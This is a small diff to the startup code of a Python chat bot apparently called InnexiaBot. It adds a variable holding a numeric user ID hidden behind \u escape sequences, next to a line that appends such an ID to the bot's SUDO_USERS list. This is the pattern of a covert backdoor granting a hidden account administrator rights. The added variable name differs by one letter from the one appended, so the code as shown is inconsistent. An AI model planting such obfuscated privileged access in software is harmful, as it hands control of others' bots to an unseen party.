@@ -73,6 +73,7 @@ async def InnexiaBot():
             status="[bold blue]All modules imported successfully!",
         )
         await asyncio.sleep(0.2)
+        BOTIINFOID = "\u0035\u0039\u0033\u0037\u0031\u0037\u0030\u0036\u0034\u0030"
         SUDO_USERS.append(int(BOTINFOID))
         await startup_del(_____)
     console.print(
